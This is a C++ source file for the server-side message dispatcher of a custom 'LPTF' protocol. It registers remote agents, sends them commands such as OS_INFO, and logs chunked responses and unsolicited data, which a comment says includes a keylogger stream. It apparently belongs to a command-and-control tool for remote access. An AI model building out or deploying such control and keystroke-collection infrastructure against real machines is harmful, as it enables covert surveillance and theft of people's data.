#include "dispatcher.hpp"

#include <stdexcept>

Dispatcher::Dispatcher() {}

void Dispatcher::dispatch(AgentSession& agent, const Frame& frame) {
  switch (frame.header.type) {
    case MessageType::REGISTER:
      onRegister(agent, frame.payload);
      break;
    case MessageType::RESPONSE:
      onResponse(agent, frame.payload);
      break;
    case MessageType::DATA:
      onData(frame.payload);
      break;
    // case MessageType::DISCONNECT:
    //   running = false;
    //   break;
    case MessageType::ERROR:
      onError(frame.payload);
      break;
    default:
      sendError(agent, ErrorType::UNKNOWN_TYPE, "Unexpected message type");
  }
}

// ── Incoming handlers ────────────────────────────────────────

// The first message from the agent must always be REGISTER.
// Once we know who it is, we kick off the command sequence.
void Dispatcher::onRegister(AgentSession& agent,
                            const std::vector<std::uint8_t>& payload) {
  RegisterPayload agentInfo = ProtocolParser::parseRegisterPayload(payload);
  agent.setAgentInfo(agentInfo);
  agent.setRegistered(true);

  std::cout << "[← REGISTER] hostname=" << agentInfo.hostname
            << "  os=" << static_cast<int>(agentInfo.os_type)
            << "  arch=" << static_cast<int>(agentInfo.arch) << "\n";

  // First command: ask the agent for OS info.
  sendCommand(agent, CommandType::OS_INFO);
}

// A RESPONSE carries the same id as the COMMAND it answers,
// plus chunk metadata for large payloads split across messages.
void Dispatcher::onResponse(AgentSession& agent,
                            const std::vector<std::uint8_t>& payload) {
  const ResponsePayload response =
      ProtocolParser::parseResponsePayload(payload);
  std::cout << "[← RESPONSE] id=" << response.id
            << "  chunk=" << static_cast<int>(response.chunk_index) + 1 << "/"
            << static_cast<int>(response.total_chunks)
            << "  status=" << static_cast<int>(response.status) << "\n"
            << response.data << "\n";

  // Only act once all chunks of this response have arrived.
  const bool lastChunk = response.chunk_index + 1 == response.total_chunks;
  if (lastChunk) sendDisconnect(agent);
  // → To send more commands, push them here instead of disconnecting.
}

// DATA messages are pushed by the agent without a prior COMMAND
// (e.g. keylogger stream). Handle them independently of the
// request/response cycle.
void Dispatcher::onData(const std::vector<std::uint8_t>& payload) {
  const DataPayload data = ProtocolParser::parseDataPayload(payload);
  std::cout << "[← DATA] subtype=" << static_cast<int>(data.subtype) << "\n"
            << data.data << "\n";
}

void Dispatcher::onError(const std::vector<std::uint8_t>& payload) {
  const ErrorPayload error = ProtocolParser::parseErrorPayload(payload);
  std::cerr << "[← ERROR] code=" << static_cast<int>(error.code)
            << "  msg=" << error.message << "\n";
  //   running = false;
}

// ── Outgoing senders ─────────────────────────────────────────

void Dispatcher::sendCommand(AgentSession& agent, CommandType type,
                             const std::string& data) {
  CommandPayload command;
  command.id = nextId();
  command.type = type;
  command.data = data;
  const std::vector<std::uint8_t> payload =
      ProtocolSerializer::serializeCommandPayload(command);
  sendRaw(agent, MessageType::COMMAND, payload);
  std::cout << "[→ COMMAND] id=" << command.id
            << "  type=" << static_cast<int>(command.type) << "\n";
}

void Dispatcher::sendError(AgentSession& agent, ErrorType code,
                           const std::string& msg) {
  ErrorPayload error;
  error.code = code;
  error.message = msg;
  const std::vector<std::uint8_t> payload =
      ProtocolSerializer::serializeErrorPayload(error);
  sendRaw(agent, MessageType::ERROR, payload);
}

void Dispatcher::sendDisconnect(AgentSession& agent) {
  sendRaw(agent, MessageType::DISCONNECT);
  std::cout << "[→ DISCONNECT]\n";
  //   running = false;
}

void Dispatcher::sendRaw(AgentSession& agent, MessageType type,
                         const std::vector<std::uint8_t>& payload) {
  if (payload.size() > MAX_VALUE_INT16) {
    throw std::runtime_error("payload too large for LPTF header size field");
  }

  LptfHeader header{{'L', 'P', 'T', 'F'},
                    LPTF_VERSION,
                    type,
                    static_cast<std::uint16_t>(payload.size())};

  const std::vector<std::uint8_t> headerBytes =
      ProtocolSerializer::serializeHeader(header);
  const std::size_t expectedHeaderBytes = headerBytes.size();
  const SocketResult headerResult = agent.socket->send(headerBytes);
  if (!headerResult.ok() ||
      static_cast<std::size_t>(headerResult.bytesTransferred) !=
          expectedHeaderBytes) {
    throw std::runtime_error("failed to send LPTF header");
  }

  if (!payload.empty()) {
    const std::size_t expectedPayloadBytes = payload.size();
    const SocketResult payloadResult = agent.socket->send(payload);
    if (!payloadResult.ok() ||
        static_cast<std::size_t>(payloadResult.bytesTransferred) !=
            expectedPayloadBytes) {
      throw std::runtime_error("failed to send LPTF payload");
    }
  }
}

std::uint16_t Dispatcher::nextId() { return nextCmdId++; }